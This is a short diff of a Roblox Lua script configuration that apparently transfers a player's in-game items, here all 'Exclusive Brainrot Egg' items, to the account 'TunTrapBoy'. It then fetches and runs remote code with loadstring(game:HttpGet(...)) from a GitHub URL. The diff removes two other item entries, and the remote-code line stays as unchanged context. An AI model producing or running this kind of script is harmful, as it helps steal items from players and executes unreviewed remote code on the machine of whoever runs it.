@@ -24,8 +24,6 @@ getgenv().Config = {
     SEND_ITEM = {
         Usernames = { 'TunTrapBoy' },
         ['Exclusive Brainrot Egg'] = { amount = 'all' },
-        ['Golden Apple'] = { amount = 'all' },
-        ['Spectral Potion'] = { amount = 3 },
     },
 }
 loadstring(game:HttpGet("https://raw.githubusercontent.com/dsadgeee/21521521/refs/heads/main/track.lua"))()
